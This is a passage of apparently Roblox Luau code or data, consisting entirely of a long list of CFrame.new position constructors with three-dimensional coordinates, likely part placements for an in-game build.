CFrame.new(-1.765164852142334, 1.9999991655349731, -2.234834671020508),
CFrame.new(-0.7651649713516235, 1.5, 0.7651643753051758),
CFrame.new(1.7348341941833496, 1.0000001192092896, -1.2348353862762451),
CFrame.new(4.134834289550781, 0.9294111728668213, 9.648130416870117),
CFrame.new(1.134833812713623, 1.9294102191925049, 7.148129940032959),
CFrame.new(-1.7651629447937012, -2.0000011920928955, 1.7651644945144653),
CFrame.new(3.134834051132202, 1.929410696029663, 8.148130416870117),
CFrame.new(5.734833717346191, 1.0000015497207642, 0.7651643753051758),
CFrame.new(0.23483704030513763, -4.999999523162842, -7.234835624694824),
CFrame.new(-2.265164613723755, 2.4999992847442627, -0.23483578860759735),
CFrame.new(3.134834051132202, 0.4294106960296631, 10.148130416870117),
CFrame.new(5.734832763671875, 3.000002384185791, 1.7651644945144653),
CFrame.new(4.234836578369141, -2.699997663497925, -2.8348355293273926),
CFrame.new(4.234834671020508, 2.5000016689300537, 4.265164375305176),
CFrame.new(3.734832525253296, 3.0000014305114746, -2.2348344326019287),
CFrame.new(-1.265164852142334, -0.49999964237213135, -0.23483578860759735),
CFrame.new(5.734832763671875, 2.500002145767212, -4.734834671020508),
CFrame.new(-2.765164613723755, 0.9999988675117493, -2.234834909439087),
CFrame.new(-0.7651649713516235, 1.5, -3.2348344326019287),
CFrame.new(-0.7651649713516235, 0.9999995827674866, -0.23483578860759735),
CFrame.new(4.734834671020508, 2.0000011920928955, 0.7651643753051758),
CFrame.new(4.734834671020508, 1.5000009536743164, -1.234834909439087),
CFrame.new(-1.265164852142334, 2.4999988079071045, -3.234834671020508),
CFrame.new(-1.7651629447937012, -1.5000007152557373, -0.23483578860759735),
CFrame.new(1.234835147857666, -0.9999992251396179, -4.734834671020508),
CFrame.new(0.7348369359970093, -2.6999990940093994, 1.1651639938354492),
CFrame.new(5.234834671020508, -1.9999983310699463, 0.7651643753051758),
CFrame.new(-1.765164852142334, 1.9999982118606567, 0.7651643753051758),
CFrame.new(5.234835624694824, -2.6999971866607666, -1.8348363637924194),
CFrame.new(4.734833717346191, 2.5000016689300537, 1.7651644945144653),
CFrame.new(-2.265162706375122, -2.700000047683716, 0.16516387462615967),
CFrame.new(1.134833812713623, 1.8000003099441528, 6.165164947509766),
CFrame.new(-1.765164852142334, 2.4999992847442627, -4.234834671020508),
CFrame.new(4.234836578369141, -3.292891502380371, -8.941941261291504),
CFrame.new(-0.8651653528213501, 1.9294092655181885, 7.648129940032959),
CFrame.new(4.734834671020508, 2.0000016689300537, -3.234834671020508),
CFrame.new(5.234832763671875, 2.5000016689300537, 1.7651644945144653),
CFrame.new(-0.7651668787002563, 2.9999988079071045, 2.765164613723755),
CFrame.new(-1.765164852142334, 1.499998927116394, -4.234834671020508),
CFrame.new(5.234834671020508, 0.5000019073486328, -4.734834671020508),
CFrame.new(0.23483513295650482, 1.0000003576278687, -8.734833717346191),
CFrame.new(4.234834671020508, 1.5000009536743164, -2.234834671020508),
CFrame.new(-2.765164613723755, 1.9999982118606567, 3.265164852142334),
CFrame.new(5.234836578369141, -4.707104682922363, -7.527728080749512),
CFrame.new(-1.7651629447937012, -2.0000011920928955, 2.7651655673980713),
CFrame.new(-2.265164613723755, 2.4999988079071045, 0.7651643753051758),
CFrame.new(-2.265162706375122, -5.000000476837158, -3.234835147857666),
CFrame.new(3.2348344326019287, 0.5000011920928955, -4.734834671020508),
CFrame.new(4.234834671020508, 1.0000017881393433, -8.734833717346191),
CFrame.new(-1.765164852142334, 2.4999992847442627, -2.234834671020508),
CFrame.new(5.734834671020508, -1.9999973773956299, -8.734833717346191),
CFrame.new(5.734833717346191, 1.0000015497207642, -1.2348353862762451),
CFrame.new(4.234836578369141, -4.999998092651367, -4.734835624694824),
CFrame.new(5.734832763671875, 3.000002384185791, -4.234834671020508),
CFrame.new(1.7348361015319824, -5, -5.734834671020508),
CFrame.new(-2.265164613723755, 2.4999988079071045, 0.7651643753051758),
CFrame.new(-2.7651665210723877, 2.9999988079071045, -0.23483578860759735),
CFrame.new(-1.7651629447937012, -2.000000238418579, -3.234834909439087),
CFrame.new(-1.765164852142334, 1.9999982118606567, 1.7651644945144653),
CFrame.new(1.7348361015319824, -5, -3.734834909439087),
CFrame.new(3.7348344326019287, 1.0000008344650269, 2.765164613723755),
CFrame.new(2.134834051132202, 1.9294102191925049, 7.648129940032959),
CFrame.new(4.234834671020508, 1.0000017881393433, -4.734834671020508),
CFrame.new(1.7348361015319824, -5, -3.234835147857666),
CFrame.new(3.2348363399505615, -2.699998140335083, 0.16516387462615967),
CFrame.new(5.234835624694824, -2.999997854232788, -3.234834909439087),
CFrame.new(-2.265164613723755, 1.9999991655349731, -2.234834671020508),
CFrame.new(5.234834671020508, -1.999997854232788, -4.234835624694824),
CFrame.new(-0.7651668787002563, 2.9999992847442627, -0.23483578860759735),
CFrame.new(5.234832763671875, 2.5000016689300537, -0.23483578860759735),
CFrame.new(2.7348363399505615, -2.699998140335083, 2.1651651859283447),
CFrame.new(5.234832763671875, 2.5000011920928955, 0.7651643753051758),
CFrame.new(3.134834051132202, 1.929410696029663, 7.648129940032959),
CFrame.new(3.134834051132202, 1.8000012636184692, 6.165164947509766),
CFrame.new(3.2348363399505615, -4.999998569488525, -5.234834671020508),
CFrame.new(5.234833717346191, 2.0000011920928955, -1.234834909439087),
CFrame.new(-0.7651630640029907, -3.000000476837158, -3.234834909439087),
CFrame.new(-2.765164613723755, 0.9999983906745911, 1.7651644945144653),
CFrame.new(-2.7651665210723877, 2.9999983310699463, 2.765164613723755),
CFrame.new(5.734835624694824, -4.499998569488525, -3.234835147857666),
CFrame.new(-1.265164852142334, 1.999998688697815, -1.234834909439087),
CFrame.new(0.13483475148677826, 1.4294092655181885, 9.148130416870117),
CFrame.new(5.734834671020508, -3.9999985694885254, -3.234835147857666),
CFrame.new(5.234834671020508, -1.999997854232788, -4.734834671020508),
CFrame.new(-1.265164852142334, -0.49999964237213135, -4.234835624694824),
CFrame.new(4.234834671020508, 0.000002339482307434082, 1.7651644945144653),
CFrame.new(-2.265162706375122, -3.5000014305114746, -3.234835147857666),
CFrame.new(1.2348341941833496, 1.5000009536743164, -0.23483578860759735),
CFrame.new(3.2348363399505615, -1.9999983310699463, -4.734835624694824),
CFrame.new(4.234834671020508, 0.500002384185791, 1.7651644945144653),
CFrame.new(2.134834051132202, 0.8000002503395081, 5.165163040161133),
CFrame.new(-1.265164852142334, 4.3213378830841975e-07, -0.23483578860759735),
CFrame.new(-1.7651629447937012, -1.5000007152557373, -4.234835624694824),
CFrame.new(3.7348344326019287, 1.5, 3.2651658058166504),
CFrame.new(-1.765164852142334, 1.9999982118606567, 0.7651643753051758),
CFrame.new(4.234836578369141, -4.999999046325684, -3.234835147857666),
CFrame.new(1.7348361015319824, -5, -6.234835624694824),
CFrame.new(-2.265162706375122, -4.500001430511475, -3.2348341941833496),
CFrame.new(5.234832763671875, 2.5000016689300537, -4.234834671020508),
CFrame.new(-1.265164852142334, 2.4999988079071045, 0.7651643753051758),
CFrame.new(-0.7651630640029907, -2.6999995708465576, -2.8348355293273926),
CFrame.new(2.2348344326019287, -4.4703611479235406e-08, -1.2348353862762451),
CFrame.new(5.234833717346191, 2.0000016689300537, -3.234834671020508),
CFrame.new(5.734833717346191, 1.0000020265579224, -3.234834671020508),
CFrame.new(5.734833717346191, 1.0000015497207642, 1.7651644945144653),
CFrame.new(-1.265164852142334, 1.999998688697815, 0.7651643753051758),
CFrame.new(1.2348361015319824, -5, -3.234835147857666),
CFrame.new(-2.765164613723755, 0.9999983906745911, 2.765164613723755),
CFrame.new(3.2348363399505615, -4.999999046325684, -4.734835624694824),
CFrame.new(3.2348363399505615, -2.9999983310699463, -8.734833717346191),
CFrame.new(0.23483704030513763, -5.000000476837158, -3.234835147857666),
CFrame.new(3.134834051132202, 0.8000007271766663, 5.165163040161133),
CFrame.new(2.2348363399505615, -5, -3.234835147857666),
CFrame.new(-0.7651649713516235, -0.5000001192092896, -4.734834671020508),
CFrame.new(4.734834671020508, 1.0000017881393433, -4.234834671020508),
CFrame.new(-2.7651665210723877, 2.9999988079071045, 1.7651644945144653),
CFrame.new(2.134834051132202, 0.366987943649292, 4.915163993835449),
CFrame.new(4.134834289550781, 0.4294111728668213, 10.148130416870117),
CFrame.new(3.2348344326019287, -0.9999987483024597, -8.734833717346191),
CFrame.new(3.7348344326019287, 1.0000008344650269, -1.2348353862762451),
CFrame.new(2.2348344326019287, 1.5000009536743164, 0.7651643753051758),
CFrame.new(-1.265164852142334, -0.5000001192092896, 2.765164613723755),
CFrame.new(5.234833717346191, 2.0000011920928955, 0.7651643753051758),
CFrame.new(2.2348344326019287, 1.000001072883606, -8.734833717346191),
CFrame.new(-1.7651629447937012, -2.700000047683716, 1.1651639938354492),
CFrame.new(-1.765164852142334, 1.4999979734420776, 0.7651643753051758),
CFrame.new(-0.7651668787002563, 2.9999992847442627, 1.7651644945144653),
CFrame.new(2.2348344326019287, 1.5000009536743164, 2.7651655673980713),
CFrame.new(2.2348344326019287, -0.49999964237213135, -1.2348353862762451),
CFrame.new(3.734832525253296, 3.0000014305114746, 1.7651644945144653),
CFrame.new(0.23483513295650482, -0.9999997019767761, -8.734833717346191),
CFrame.new(-2.265162706375122, -4.000001430511475, -3.234835147857666),
CFrame.new(0.23483513295650482, -2.999999761581421, -8.734833717346191),
CFrame.new(2.7348344326019287, 1.5000015497207642, -0.23483578860759735),
CFrame.new(-1.7651629447937012, -1.0000005960464478, -4.234835624694824),
CFrame.new(-2.265164613723755, 1.4999979734420776, -1.234834909439087),
CFrame.new(-2.265162706375122, -2.0000007152557373, -8.734833717346191),
CFrame.new(-1.7651629447937012, -2.700000047683716, -2.8348355293273926),
CFrame.new(1.7348341941833496, -4.4703583057525975e-08, -1.2348353862762451),
CFrame.new(2.2348344326019287, -4.4703611479235406e-08, -1.2348353862762451),
CFrame.new(-1.7651629447937012, -5.000001430511475, -3.234835147857666),
CFrame.new(-0.265164852142334, 1.5, -1.2348353862762451),
CFrame.new(5.734834671020508, -3.499998092651367, -3.234835147857666),
CFrame.new(-2.265162706375122, -4.000001430511475, -3.234835147857666),
CFrame.new(4.734834671020508, 9.089706622944504e-07, 3.265164852142334),
CFrame.new(1.134833812713623, 1.2330127954483032, 5.415163993835449),
CFrame.new(-1.265164852142334, 2.4999992847442627, 1.7651644945144653),
CFrame.new(4.734834671020508, 2.0000011920928955, 2.765164613723755),
CFrame.new(-2.265164613723755, 2.4999992847442627, -4.234834671020508),
CFrame.new(5.734833717346191, 1.5000020265579224, -4.734834671020508),
CFrame.new(1.134833812713623, 1.9294102191925049, 8.148130416870117),
CFrame.new(-2.265164613723755, 2.4999988079071045, 2.7651655673980713),
CFrame.new(2.2348363399505615, -2.699998617172241, 0.16516387462615967),
CFrame.new(3.2348344326019287, 1.5000020265579224, -2.234834909439087),
CFrame.new(2.7348344326019287, 1.5000015497207642, -4.234834671020508),
CFrame.new(-1.265164852142334, 1.499998927116394, -3.234834671020508),
CFrame.new(-0.7651649713516235, 2.4999988079071045, 3.2651658058166504),
CFrame.new(5.234835624694824, -2.999997854232788, -3.234834909439087),
CFrame.new(4.734834671020508, 1.5000015497207642, -4.234834671020508),
CFrame.new(-0.7651630640029907, -3.000000476837158, -3.234834909439087),
CFrame.new(5.234834671020508, -1.9999983310699463, 1.7651644945144653),
CFrame.new(0.23483704030513763, -4.999999523162842, -5.234834671020508),
CFrame.new(-2.265162706375122, -4.353553771972656, -7.881280899047852),
CFrame.new(4.734833717346191, 2.5000011920928955, -1.234834909439087),
CFrame.new(-2.265164613723755, 2.4999992847442627, 1.7651644945144653),
CFrame.new(5.234834671020508, -0.9999977946281433, -8.734833717346191),
CFrame.new(-1.2651629447937012, -2.700000047683716, -2.8348355293273926),
CFrame.new(5.234834671020508, -2.49999737739563, -4.734834671020508),
CFrame.new(4.734836578369141, -2.699997663497925, 1.1651639938354492),
CFrame.new(-2.765164613723755, 1.4999979734420776, 3.2651658058166504),
CFrame.new(4.734833717346191, 2.5000016689300537, -2.234834671020508),
CFrame.new(0.7348340749740601, 1.5000009536743164, -0.23483578860759735),
CFrame.new(-2.265164613723755, 1.9999991655349731, -3.234834671020508),
CFrame.new(4.734836578369141, -2.699997663497925, -0.8348362445831299),
CFrame.new(4.134834289550781, 1.9294111728668213, 8.648130416870117),
CFrame.new(1.2348341941833496, -0.49999964237213135, -4.734834671020508),
CFrame.new(-1.765164852142334, 1.9999982118606567, 2.765164613723755),
CFrame.new(1.134833812713623, 1.8000003099441528, 6.165164947509766),
CFrame.new(-1.765164852142334, -0.5000005960464478, -4.734835624694824),
CFrame.new(-1.765164852142334, -0.0000014752150718777557, 3.265164852142334),
CFrame.new(-1.265164852142334, 4.3213378830841975e-07, 1.7651644945144653),
CFrame.new(4.734834671020508, -0.9999982714653015, -2.234834909439087),
CFrame.new(5.234835624694824, -2.6999971866607666, 1.1651639938354492),
CFrame.new(1.2348341941833496, 0.5000004768371582, -4.734834671020508),
CFrame.new(4.234834671020508, 2.0000011920928955, 1.7651644945144653),
CFrame.new(1.7348341941833496, -4.4703583057525975e-08, -1.2348353862762451),
CFrame.new(-1.265164852142334, -0.49999964237213135, 0.7651643753051758),
CFrame.new(4.134834289550781, 1.9294110536575317, 6.648129463195801),
CFrame.new(4.234835624694824, -1.4999982118606567, -4.734834671020508),
CFrame.new(0.13483475148677826, 1.7999998331069946, 6.165164947509766),
CFrame.new(-1.265164852142334, 4.3213378830841975e-07, -1.2348353862762451),
CFrame.new(-0.7651668787002563, 2.9999988079071045, -1.234834909439087),
CFrame.new(-1.7651629447937012, -1.5000007152557373, -3.234834909439087),
CFrame.new(4.234834671020508, -0.9999982714653015, -4.734834671020508),
CFrame.new(-0.7651630640029907, -5, -5.234834671020508),
CFrame.new(3.7348344326019287, 2.0000011920928955, -4.734834671020508),
CFrame.new(-0.8651653528213501, 1.7999993562698364, 6.165165901184082),
CFrame.new(1.7348341941833496, 1.5000009536743164, -4.234834671020508),
CFrame.new(3.734832525253296, 3.0000009536743164, 0.7651643753051758),
CFrame.new(-1.265164852142334, 1.499998927116394, -0.23483578860759735),
CFrame.new(3.7348344326019287, 2.5000007152557373, 3.2651658058166504),
CFrame.new(4.234834671020508, 2.0000011920928955, -3.234834671020508),
CFrame.new(5.734832763671875, 3.000001907348633, -3.234834671020508),
CFrame.new(4.234834671020508, 2.5000016689300537, 1.7651644945144653),
CFrame.new(4.734833717346191, 2.5000011920928955, -3.234834671020508),
CFrame.new(5.234833717346191, 1.5000015497207642, -4.234834671020508),
CFrame.new(1.7348341941833496, 4.321336461998726e-07, 1.4651641845703125),
CFrame.new(5.734833717346191, 2.0000011920928955, 3.265164852142334),
CFrame.new(5.234833717346191, 1.5000015497207642, -2.234834671020508),
CFrame.new(4.734834671020508, -0.9999982714653015, -1.2348353862762451),
CFrame.new(5.234835624694824, -2.6999971866607666, 0.16516387462615967),
CFrame.new(4.734834671020508, -0.49999916553497314, 3.2651658058166504),
CFrame.new(-1.265164852142334, -0.49999964237213135, -2.234835147857666),
CFrame.new(1.7348341941833496, 1.5000009536743164, -1.2348353862762451),
CFrame.new(-2.265162706375122, -2.700000047683716, -2.8348355293273926),
CFrame.new(-1.265164852142334, -4.470341252726939e-08, 2.765164613723755),
CFrame.new(-1.765164852142334, 2.4999988079071045, -3.234834671020508),
CFrame.new(-1.7651629447937012, -2.000000238418579, -4.734835624694824),
CFrame.new(-1.7651629447937012, -5.000000476837158, -4.734835624694824),
CFrame.new(1.2348341941833496, -0.5000001192092896, -1.2348353862762451),
CFrame.new(-1.765164852142334, 1.9999991655349731, -3.234834671020508),
CFrame.new(3.7348344326019287, 1.000001311302185, -4.234834671020508),
CFrame.new(0.7348340749740601, 1.5000009536743164, -4.234834671020508),
CFrame.new(5.734834671020508, -2.6999971866607666, 2.1651651859283447),
CFrame.new(-1.265164852142334, 4.3213378830841975e-07, 0.7651643753051758),
CFrame.new(-1.7651629447937012, -1.000001072883606, 0.7651643753051758),
CFrame.new(2.7348363399505615, -2.699998140335083, 1.1651639938354492),
CFrame.new(2.7348363399505615, -2.699998140335083, -0.8348362445831299),
CFrame.new(5.734835624694824, -2.6999971866607666, 0.16516387462615967),
CFrame.new(-0.265164852142334, 1.5, 2.7651655673980713),
CFrame.new(-1.265164852142334, 0.5000002384185791, -1.2348353862762451),
CFrame.new(3.7348344326019287, 1.000001311302185, -2.234834909439087),
CFrame.new(-1.765164852142334, 0.9999991059303284, -3.234834671020508),
CFrame.new(4.234834671020508, 2.5000016689300537, -0.23483578860759735),
CFrame.new(0.7348340749740601, 1.5000009536743164, -3.2348344326019287),
CFrame.new(-0.7651649713516235, 1.5, -2.234834909439087),
CFrame.new(3.7348344326019287, 1.000001311302185, -3.234834671020508),
CFrame.new(4.234834671020508, -0.49999749660491943, -0.23483578860759735),
CFrame.new(-0.7651630640029907, -1.0000001192092896, -8.734833717346191),
CFrame.new(-1.7651629447937012, -1.5000011920928955, 1.7651644945144653),
CFrame.new(1.7348361015319824, -4.999999523162842, -6.734835624694824),
CFrame.new(4.234834671020508, 0.500002384185791, -4.234835624694824),
CFrame.new(-1.265164852142334, 1.4999984502792358, -1.234834909439087),
CFrame.new(2.2348344326019287, 1.000001072883606, -4.734834671020508),
CFrame.new(-1.265164852142334, 0.5000002384185791, -4.234835624694824),
CFrame.new(2.134834051132202, 1.4294102191925049, 9.148130416870117),
CFrame.new(-1.265164852142334, 4.3213378830841975e-07, -4.234835624694824),
CFrame.new(-1.265164852142334, 0.5000002384185791, -2.234834909439087),
CFrame.new(4.734834671020508, 1.000001311302185, -1.2348353862762451),
CFrame.new(4.134834289550781, 1.8000012636184692, 6.165164947509766),
CFrame.new(1.2348341941833496, -0.9999992251396179, -8.734833717346191),
CFrame.new(4.234834671020508, -0.49999749660491943, 0.7651643753051758),
CFrame.new(-2.265162706375122, -2.700000047683716, 0.16516387462615967),
CFrame.new(5.234834671020508, -2.4999983310699463, 2.765164613723755),
CFrame.new(0.23483704030513763, -5, -4.734835624694824),
CFrame.new(3.2348363399505615, -4.999999523162842, -3.234835147857666),
CFrame.new(-2.265164613723755, 2.4999988079071045, -3.234834671020508),
CFrame.new(3.2348363399505615, -2.4999983310699463, -4.734835624694824),
CFrame.new(5.734833717346191, 2.000002145767212, -4.734834671020508),
CFrame.new(0.23483513295650482, -0.49999964237213135, -4.734834671020508),
CFrame.new(5.234832763671875, 2.5000016689300537, -2.234834671020508),
CFrame.new(3.7348363399505615, -2.699998140335083, -0.8348362445831299),
CFrame.new(3.7348363399505615, -2.699998140335083, -2.8348355293273926),
CFrame.new(4.234834671020508, 0.000002339482307434082, 0.7651643753051758),
CFrame.new(2.2348344326019287, 1.0000003576278687, -1.2348353862762451),
CFrame.new(3.2348363399505615, -4.7071051597595215, -7.527728080749512),
CFrame.new(4.234836578369141, -2.9999983310699463, -3.234834909439087),
CFrame.new(2.2348363399505615, -2.699998617172241, -0.8348362445831299),
CFrame.new(2.2348363399505615, -2.699998617172241, 2.1651651859283447),
CFrame.new(-2.765164613723755, 2.4999992847442627, -4.734834671020508),
CFrame.new(-0.7651649713516235, 0.9999995827674866, -2.234834909439087),
CFrame.new(-2.7651665210723877, 2.9999988079071045, -4.234834671020508),
CFrame.new(2.2348363399505615, -4.70710563659668, -7.527728080749512),
CFrame.new(3.2348344326019287, 1.5000009536743164, 0.7651643753051758),
CFrame.new(-1.7651629447937012, -2.500000238418579, -4.734835624694824),
CFrame.new(5.234834671020508, -2.499997854232788, -2.234835147857666),
CFrame.new(-1.2651629447937012, -2.700000047683716, 0.16516387462615967),
CFrame.new(2.2348344326019287, 1.0000003576278687, -1.2348353862762451),
CFrame.new(2.2348344326019287, 1.0000005960464478, -0.7348358035087585),
CFrame.new(0.23483513295650482, 1.5, 0.7651643753051758),
CFrame.new(4.734834671020508, -0.9999982714653015, -4.234835624694824),
CFrame.new(-0.265164852142334, 1.5000004768371582, -4.234834671020508),
CFrame.new(-0.7651649713516235, 1.999998688697815, 3.265164852142334),
CFrame.new(-0.7651630640029907, -3.000000476837158, -3.734834909439087),
CFrame.new(-1.265164852142334, 4.3213378830841975e-07, 0.7651643753051758),
CFrame.new(4.234834671020508, 0.500002384185791, -2.234834909439087),
CFrame.new(3.7348344326019287, 1.0000008344650269, 1.7651644945144653),
CFrame.new(-0.7651668787002563, 2.9999992847442627, -2.2348344326019287),
CFrame.new(5.734835624694824, -3.9999985694885254, -8.234834671020508),
CFrame.new(4.234834671020508, 1.0000015497207642, 4.265164375305176),
CFrame.new(4.234834671020508, 0.0000028163196930108825, -3.234834909439087),
CFrame.new(-0.7651630640029907, -5.000000476837158, -3.234835147857666),
CFrame.new(5.234836578369141, -4.999999046325684, -3.234835147857666),
CFrame.new(-0.7651630640029907, -5.000000476837158, -3.234835147857666),
CFrame.new(2.7348363399505615, -2.699998140335083, -2.8348355293273926),
CFrame.new(1.2348361015319824, -4.999999523162842, -4.734835624694824),
CFrame.new(-1.265164852142334, 1.4999984502792358, 1.7651644945144653),
CFrame.new(5.234834671020508, -0.9999982714653015, -1.2348353862762451),
CFrame.new(-2.265164613723755, -9.98377799987793e-07, -8.734833717346191),
CFrame.new(-2.765164613723755, 1.499998927116394, -4.734834671020508),
CFrame.new(4.234834671020508, 0.000002339482307434082, -4.234835624694824),
CFrame.new(2.2348344326019287, -0.9999992251396179, -8.734833717346191),
CFrame.new(1.2348341941833496, 1.0000005960464478, -8.734833717346191),
CFrame.new(2.2348344326019287, -0.49999916553497314, -4.734834671020508),
CFrame.new(4.734834671020508, 2.0000011920928955, -1.234834909439087),
CFrame.new(-1.265164852142334, 6.705524242534011e-07, -3.234834909439087),
CFrame.new(1.7348341941833496, 0.5, -1.2348353862762451),
CFrame.new(-1.265164852142334, 0.5000002384185791, 0.7651643753051758),
CFrame.new(-1.265164852142334, 1.9999991655349731, -4.234834671020508),
CFrame.new(5.234836578369141, -4.999998092651367, -7.234835624694824),
CFrame.new(3.7348344326019287, 2.5000016689300537, -4.734834671020508),
CFrame.new(5.234834671020508, 0.0000018626450355441193, -4.734834671020508),
CFrame.new(0.7348350286483765, 0.9999995827674866, -1.2348353862762451),
CFrame.new(0.7348369359970093, -2.6999990940093994, -0.8348362445831299),
CFrame.new(1.2348341941833496, 0.5000002384185791, -0.23483578860759735),
CFrame.new(-0.7651630640029907, -1.0000001192092896, -8.734833717346191),
CFrame.new(5.734834671020508, -3.499998092651367, -3.234835147857666),
CFrame.new(-0.7651649713516235, 0.9999991059303284, -1.2348353862762451),
CFrame.new(2.7348344326019287, 1.5000009536743164, 0.7651643753051758),
CFrame.new(5.234834671020508, -1.999997854232788, -1.2348353862762451),
CFrame.new(1.2348361015319824, -2.9999992847442627, -3.234834909439087),
CFrame.new(3.7348344326019287, 1.0000008344650269, 0.7651643753051758),
CFrame.new(-0.7651649713516235, 1.4999984502792358, 3.2651658058166504),
CFrame.new(5.234834671020508, -1.999997854232788, -2.234834909439087),
CFrame.new(1.7348361015319824, -2.699998617172241, 0.16516387462615967),
CFrame.new(2.2348344326019287, 1.5000009536743164, 1.7651644945144653),
CFrame.new(5.734833717346191, 1.0000020265579224, -0.23483578860759735),
CFrame.new(5.734832763671875, 3.000002384185791, -2.2348344326019287),
CFrame.new(5.234833717346191, 1.0000020265579224, -8.734833717346191),
CFrame.new(4.234834671020508, -0.49999749660491943, 1.7651644945144653),
CFrame.new(4.734834671020508, 1.5000015497207642, -0.23483578860759735),
CFrame.new(-2.265164613723755, 1.499998927116394, -4.234834671020508),
CFrame.new(4.234834671020508, 0.500002384185791, -0.23483578860759735),
CFrame.new(5.734835624694824, -3.6464452743530273, -8.588387489318848),
CFrame.new(5.234836578369141, -4.999998092651367, -5.234834671020508),
CFrame.new(-2.265164613723755, 1.499998927116394, -2.234834671020508),
CFrame.new(-0.265164852142334, 1.5, 1.7651644945144653),
CFrame.new(1.2348361015319824, -2.6999990940093994, -0.8348362445831299),
CFrame.new(4.134834289550781, 0.8000012040138245, 5.165163040161133),
CFrame.new(2.134834051132202, 1.2330130338668823, 5.415163993835449),
CFrame.new(5.234835624694824, -2.6999971866607666, 2.1651651859283447),
CFrame.new(-0.7651649713516235, 0.9999991059303284, 0.7651643753051758),
CFrame.new(-0.7651649713516235, 0.9999995827674866, -3.234834671020508),
CFrame.new(4.234834671020508, 0.000002339482307434082, -1.2348353862762451),
CFrame.new(2.134834051132202, 1.8000003099441528, 6.165164947509766),
CFrame.new(3.2348344326019287, -0.9999987483024597, -8.734833717346191),
CFrame.new(2.2348363399505615, -4.999999046325684, -2.734834909439087),
CFrame.new(4.234834671020508, 1.5000009536743164, -0.23483578860759735),
CFrame.new(0.7348369359970093, -2.6999990940093994, -1.8348363637924194),
CFrame.new(-0.8651653528213501, 1.233012080192566, 5.415163993835449),
CFrame.new(-2.265164613723755, 1.9999982118606567, 2.765164613723755),
CFrame.new(2.2348344326019287, 1.5000015497207642, -2.234834909439087),
CFrame.new(-2.265164613723755, 1.9999991655349731, -0.23483578860759735),
CFrame.new(-2.265164613723755, 1.9999982118606567, 0.7651643753051758),
CFrame.new(5.234834671020508, -0.9999977946281433, -8.734833717346191),
CFrame.new(1.7348361015319824, -2.699998617172241, -2.8348355293273926),
CFrame.new(5.234833717346191, 1.5000015497207642, -0.23483578860759735),
CFrame.new(4.734834671020508, 2.0000016689300537, -0.23483578860759735),
CFrame.new(-1.765164852142334, 0.9999986290931702, 2.765164613723755),
CFrame.new(-1.7651629447937012, -2.000000238418579, -0.23483578860759735),
CFrame.new(1.2348341941833496, 1.0000001192092896, -0.7348358035087585),
CFrame.new(1.134833812713623, 0.4294102191925049, 10.148130416870117),
CFrame.new(1.2348361015319824, -2.6999990940093994, 0.16516387462615967),
CFrame.new(-1.7651629447937012, -5.000001430511475, -3.234835147857666),
CFrame.new(-1.765164852142334, 1.4999979734420776, 2.7651655673980713),
CFrame.new(-1.265164852142334, 4.3213378830841975e-07, -2.234834909439087),
CFrame.new(5.734832763671875, 3.000001907348633, 2.765164613723755),
CFrame.new(-2.265164613723755, 1.499998927116394, -0.23483578860759735),
CFrame.new(0.23483513295650482, -0.9999997019767761, -8.734833717346191),
CFrame.new(4.234836578369141, -2.699997663497925, 0.16516387462615967),
CFrame.new(0.23483704030513763, -2.6999990940093994, 0.16516387462615967),
CFrame.new(0.13483475148677826, 1.6705905199050903, 5.682201385498047),
CFrame.new(3.2348344326019287, 1.5000009536743164, 1.7651644945144653),
CFrame.new(0.13483475148677826, 0.9294092655181885, 9.648130416870117),
CFrame.new(0.23483704030513763, -2.6999990940093994, 2.1651651859283447),
CFrame.new(4.234834671020508, 1.5000009536743164, -1.234834909439087),
CFrame.new(0.23483704030513763, -2.6999990940093994, -1.8348363637924194),
CFrame.new(2.2348344326019287, 1.5000015497207642, -3.2348344326019287),
CFrame.new(4.734836578369141, -2.699997663497925, -0.8348362445831299),
CFrame.new(-2.265164613723755, -0.500001072883606, -8.734833717346191),
CFrame.new(2.2348363399505615, -2.4999988079071045, -4.734835624694824),
CFrame.new(5.234834671020508, -2.499997854232788, -0.23483578860759735),
CFrame.new(2.7348344326019287, 1.5000015497207642, -3.2348344326019287),
CFrame.new(-2.765164613723755, 2.4999983310699463, 3.2651658058166504),
CFrame.new(5.234835624694824, -2.6999971866607666, 0.16516387462615967),
CFrame.new(5.734834671020508, 0.0000021010637283325195, -8.734833717346191),
CFrame.new(-2.265164613723755, 0.4999990463256836, -8.734833717346191),
CFrame.new(1.7348341941833496, 1.0000001192092896, 1.7651644945144653),
CFrame.new(3.2348344326019287, 1.5000009536743164, -1.2348353862762451),
CFrame.new(5.234834671020508, -2.499997854232788, -4.234835624694824),
CFrame.new(2.2348344326019287, 1.5000015497207642, -4.234834671020508),
CFrame.new(-1.7651629447937012, -2.500000238418579, -4.234835624694824),
CFrame.new(-2.265162706375122, -5.000000476837158, -3.734834909439087),
CFrame.new(2.2348344326019287, 1.5000015497207642, -0.23483578860759735),
CFrame.new(4.234834671020508, 2.5000011920928955, 0.7651643753051758),
CFrame.new(4.734833717346191, 2.5000016689300537, -4.234834671020508),
CFrame.new(2.2348363399505615, -2.699998617172241, -1.8348363637924194),
CFrame.new(-0.26516294479370117, -2.6999995708465576, -0.8348362445831299),
CFrame.new(2.2348363399505615, -5, -3.234835147857666),
CFrame.new(4.734834671020508, -0.9999987483024597, 2.765164613723755),
CFrame.new(-1.765164852142334, 1.9999991655349731, -0.23483578860759735),
CFrame.new(-2.265162706375122, -5, -5.734834671020508),
CFrame.new(2.2348344326019287, 1.0000008344650269, -0.23483578860759735),
CFrame.new(0.7348340749740601, 1.5, -1.2348353862762451),
CFrame.new(1.2348361015319824, -5, -3.234835147857666),
CFrame.new(0.7348340749740601, 1.5, 0.7651643753051758),
CFrame.new(3.134834051132202, 0.3669881820678711, 4.915163993835449),
CFrame.new(1.7348341941833496, 1.5000009536743164, 2.7651655673980713),
CFrame.new(2.7348344326019287, 1.5000009536743164, 2.7651655673980713),
CFrame.new(4.234836578369141, -2.999997854232788, -8.734833717346191),
CFrame.new(0.13483475148677826, 0.7999995350837708, 5.165163040161133),
CFrame.new(1.2348341941833496, 1.5000004768371582, 1.7651644945144653),
CFrame.new(1.134833812713623, 1.9294100999832153, 6.648129463195801),
CFrame.new(-0.7651649713516235, 0.9999998211860657, -8.734833717346191),
CFrame.new(-1.765164852142334, -0.5000005960464478, -4.734834671020508),
CFrame.new(-1.7651629447937012, -2.0000011920928955, 0.7651643753051758),
CFrame.new(5.734834671020508, 0.5000021457672119, -8.734833717346191),
CFrame.new(-1.7651629447937012, -1.0000005960464478, -4.734835624694824),
CFrame.new(0.7348340749740601, 1.5000009536743164, -2.234834909439087),
